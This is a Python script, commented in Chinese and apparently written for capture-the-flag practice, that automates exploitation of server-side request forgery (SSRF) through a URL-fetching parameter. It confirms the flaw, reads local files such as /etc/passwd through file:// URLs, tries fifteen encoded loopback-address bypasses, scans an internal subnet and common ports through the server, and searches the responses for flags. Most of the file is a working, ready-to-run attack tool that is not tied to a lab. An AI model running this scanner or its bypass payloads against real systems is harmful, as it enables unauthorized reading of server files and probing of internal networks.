# -*- coding: utf-8 -*-
"""
通用 SSRF 扫描器（工具固化版）—— 换题不用改代码，只改参数

用法:
  python ssrf_scanner.py -u http://靶机/ -p url_to_analyze
  python ssrf_scanner.py -u http://靶机/ -p url_to_analyze -n 172.17.0.0/24 -c 15 --ports 80 5000 8080

参数:
  -u   分析器页面 URL（必填）
  -p   URL 参数名（默认 url_to_analyze）
  -n   内网网段 CIDR（默认 172.17.0.0/24）
  -c   每个网段扫前几个 IP（默认 10）
  --ports  要扫的端口列表（默认 80）
  -t   超时秒数（默认 8）

流程（SSRF 万能套路）:
  ① 验证 SSRF：http://example.com 是否回显
  ② file:// 读本地：/etc/passwd /flag /flag.txt
  ③ 回环变体轰炸：127.0.0.1 的 16 种写法
  ④ 内网扫描：网段前 N 个 IP × 端口
  ⑤ 内网页面全文搜 flag（通用正则 flag{...}）
"""
import argparse
import ipaddress
import re
import sys

import requests

# ---- 通用词表（死知识，全题型通用） ----

# 回环地址变体
LOOPBACK_VARIANTS = [
    'http://127.0.0.1/', 'http://127.1/', 'http://127.0.1/',
    'http://2130706433/',          # 十进制
    'http://0x7f000001/',          # 十六进制
    'http://0177.0.0.1/',          # 八进制
    'http://0x7f.1/',              # 混合
    'http://[::1]/',               # IPv6
    'http://[0:0:0:0:0:0:0:1]/',
    'http://0/',                   # 0.0.0.0
    'http://localhost/', 'http://localhost./',
    'http://127.0.0.1.nip.io/',    # DNS 回环
    'http://localtest.me/',
    'http://%31%32%37%2e%30%2e%30%2e%31/',  # URL编码
]

# 本地文件尝试
LOCAL_FILES = ['/etc/passwd', '/flag', '/flag.txt', '/etc/hosts']

# 内网常见端口
COMMON_PORTS = [80, 5000, 8000, 8080, 3000, 8888, 9000]

# flag 通用正则（兼容 flag{...} 和 FLAG{...}）
FLAG_RE = re.compile(r'[Ff][Ll][Aa][Gg]\{[^}]+\}')


class Analyzer:
    """包装"URL 分析器"类服务：给它目标，它替我们访问并回显"""

    def __init__(self, url, param, timeout):
        self.url = url
        self.param = param
        self.timeout = timeout

    def fetch(self, target):
        """让服务端访问 target，返回 (状态码, 响应头文本, 响应体)，失败返回 None"""
        try:
            r = requests.post(self.url, data={self.param: target}, timeout=self.timeout)
        except Exception:
            return None
        # 尝试多种"分析结果"展示格式（不同题页面结构不同，都试一遍）
        m = re.search(r'状态码:</strong>\s*<span[^>]*>(\d+)</span>', r.text)
        status = m.group(1) if m else None
        m = re.search(r'响应体内容:</h5>\s*<pre>(.*?)</pre>', r.text, re.S)
        if not m:
            m = re.search(r'<pre>(.*?)</pre>', r.text, re.S)
        if not m:
            return (status, None, None)
        body = m.group(1)
        body = (body.replace('&lt;', '<').replace('&gt;', '>')
                    .replace('&#34;', '"').replace('&#39;', "'")
                    .replace('&amp;', '&'))
        return (status, None, body)


def scan(args):
    a = Analyzer(args.url, args.param, args.timeout)

    print('=== ① 验证 SSRF ===')
    res = a.fetch('http://example.com')
    if not res or not res[2]:
        print('   ⛔ 目标不像是 URL 分析器（example.com 无回显），请检查 -u/-p')
        return
    print('   ✅ 服务器代访问 example.com 成功，回显前 60 字: %s' % res[2][:60])

    print()
    print('=== ② file:// 读本地 ===')
    for path in LOCAL_FILES:
        res = a.fetch('file://' + path)
        if res and res[2]:
            print('   ✅ %s 可读: %s' % (path, res[2][:80]))
            m = FLAG_RE.search(res[2])
            if m:
                print('   🎯 找到 flag: %s' % m.group(0))
                return
        else:
            print('   ⛔ %s 被拒/无内容' % path)

    print()
    print('=== ③ 回环变体轰炸 ===')
    loop_ok = False
    for v in LOOPBACK_VARIANTS:
        res = a.fetch(v)
        if res and res[2]:
            print('   ✅ %s 有回显！' % v)
            m = FLAG_RE.search(res[2])
            if m:
                print('   🎯 找到 flag: %s' % m.group(0))
                return
            loop_ok = True
    if not loop_ok:
        print('   全灭 → 有回环过滤，转战内网')

    print()
    print('=== ④ 内网扫描 %s（前 %d 个 IP × 端口 %s）===' % (
        args.net, args.count, ','.join(map(str, args.ports))))
    net = ipaddress.ip_network(args.net, strict=False)
    found = []
    for i, ip in enumerate(net.hosts()):
        if i >= args.count:
            break
        for port in args.ports:
            target = 'http://%s:%d/' % (ip, port)
            res = a.fetch(target)
            if res and res[2]:
                print('   ✅ %s 存活！' % target)
                found.append((target, res[2]))
    if not found:
        print('   网段内无存活服务，可换 -n 10.0.0.0/24 或 192.168.1.0/24 重试')
        return

    print()
    print('=== ⑤ 内网页面搜 flag ===')
    for target, body in found:
        hits = FLAG_RE.findall(body)
        if hits:
            for h in hits:
                print('   🎯 %s => %s' % (target, h))
        else:
            print('   %s 页面无 flag（可人工看内容: 页面前 200 字）' % target)
            print('      %s' % body[:200].replace('\n', ' '))


def main():
    p = argparse.ArgumentParser(description='通用 SSRF 扫描器')
    p.add_argument('-u', '--url', required=True, help='分析器页面 URL')
    p.add_argument('-p', '--param', default='url_to_analyze', help='URL 参数名')
    p.add_argument('-n', '--net', default='172.17.0.0/24', help='内网网段 CIDR')
    p.add_argument('-c', '--count', type=int, default=10, help='每个网段扫前 N 个 IP')
    p.add_argument('--ports', type=int, nargs='+', default=[80], help='端口列表')
    p.add_argument('-t', '--timeout', type=int, default=8, help='超时秒数')
    scan(p.parse_args())


if __name__ == '__main__':
    main()
